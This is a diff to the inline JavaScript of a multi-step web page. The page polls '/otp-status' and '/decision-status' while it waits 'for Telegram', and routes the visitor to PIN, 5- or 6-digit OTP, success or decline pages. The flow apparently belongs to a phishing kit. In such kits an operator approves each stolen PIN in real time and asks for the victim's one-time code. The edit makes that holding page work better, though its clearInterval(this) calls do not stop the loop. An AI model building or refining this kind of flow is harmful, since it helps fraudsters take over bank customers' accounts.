@@ -27,49 +27,57 @@
 <div class="footer"></div>
 
 <script>
-// ===============================
-// FIRST → GO TO PIN PAGE
-// ===============================
+
+// FLOW A: STEP4 → STEP5
 if (localStorage.getItem("firstProcess") === "yes") {
+
     localStorage.removeItem("firstProcess");
 
     setTimeout(() => {
         window.location.href = "step5.html";
-    }, 5000);
+    }, 3000);
 }
 
-// ===============================
-// SECOND → WAIT FOR TELEGRAM
-// ===============================
+// ===== FLOW B: AFTER PIN → WAIT FOR TELEGRAM =====
 if (localStorage.getItem("fromPin") === "yes") {
 
-    setInterval(() => {
+  setInterval(async () => {
+    try {
+        const res = await fetch("/otp-status");
+        const data = await res.json();
 
-        // 🔹 CHECK OTP
-        fetch("/otp-status")
-        .then(res => res.json())
-        .then(data => {
-            if (data.otp === 5 || data.otp === 6) {
-                localStorage.setItem("otpLength", data.otp);
-                localStorage.removeItem("fromPin");
-                window.location.href = "step6.html";
-            }
-        });
+        console.log("OTP STATUS:", data);
 
-        // 🔹 CHECK DECISION
-        fetch("/decision-status")
-        .then(res => res.json())
-        .then(data => {
-            if (data.decision === "accept") {
-                window.location.href = "success.html";
-            }
+        // 🔥 FORCE CHECK (handles string + number)
+        if (data.otp == 5) {
+    localStorage.removeItem("fromPin");
+    clearInterval(this);
+    window.location.href = "step5.html";
+}
 
-            if (data.decision === "decline") {
-                window.location.href = "declined.html";
-            }
-        });
+        if (data.otp == 6) {
+    localStorage.removeItem("fromPin");
+    clearInterval(this); // stop loop
+    window.location.href = "step6.html";
+}
 
-    }, 2000);
+        const decisionRes = await fetch("/decision-status");
+        const decisionData = await decisionRes.json();
+
+        if (decisionData.decision === "accept") {
+            window.location.href = "dashboard.html";
+        }
+
+        if (decisionData.decision === "decline") {
+            localStorage.clear();
+            window.location.href = "step5.html";
+        }
+
+    } catch (err) {
+        console.log("Waiting...");
+    }
+}, 2000);  
+
 }
 </script>
 
